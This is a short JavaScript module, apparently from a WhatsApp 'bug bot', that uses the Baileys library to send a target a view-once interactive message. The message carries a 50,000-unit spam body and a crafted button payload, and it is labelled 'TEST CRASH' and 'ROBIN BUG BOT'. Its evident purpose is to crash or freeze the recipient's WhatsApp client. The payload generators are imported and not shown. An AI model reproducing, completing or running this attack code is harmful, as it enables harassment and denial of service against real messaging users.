
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { getSuperPayload, getButtonPayload } = require('./SuperPayload');

async function test(SYxS7, target) {
    const superSpam = getSuperPayload(50000);
    const payload = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: { title: "TEST CRASH", hasMediaAttachment: false },
                    body: { text: superSpam },
                    footer: { text: "ROBIN BUG BOT" },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "single_select",
                            buttonParamsJson: getButtonPayload()
                        }]
                    }
                }
            }
        }
    };

    await SYxS7.relayMessage(target, payload, { participant: { jid: target } });
}

module.exports = { test };
